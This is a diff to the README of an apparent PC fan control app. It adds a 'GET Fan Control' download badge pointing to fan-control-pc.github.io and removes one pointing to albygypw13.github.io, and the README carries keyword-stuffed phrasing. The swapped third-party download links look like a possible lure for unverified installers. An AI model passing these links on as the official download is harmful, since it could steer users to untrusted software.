@@ -54,6 +54,8 @@ The graph points live in [graph.rs](curve/graph.rs). A straight ramp, when you d
 | Gaming | Earlier rise so the GPU does not sit at its limit |
 | Custom | A graph you drew and saved under your own name |
 
+[![GET Fan Control](https://img.shields.io/badge/GET-Fan%20Control-B45309?style=social&labelColor=78350F&logoColor=white)](https://fan-control-pc.github.io/GPU-Fan-Control/)
+
 ## Features
 
 Calibration runs the fan across its range and records the percent where it actually starts, and the RPM the header reports. A header with no RPM wire still accepts a percent. It just cannot show speed.
@@ -188,8 +190,6 @@ fancontrol windows and fan control for windows 10 are the same desktop app. Ther
 ### Packaged build
 
 Download one package. Portable zip or installer, from the publisher. One button.
-
-[![GET Fan Control](https://img.shields.io/badge/GET-Fan%20Control-B45309?style=social&labelColor=78350F&logoColor=white)](https://albygypw13.github.io/.github/Fan-Control)
 
 The current version stamp shipped with the release notes is [version.json](version.json). A repack that adds a toolbar is not this program.
 
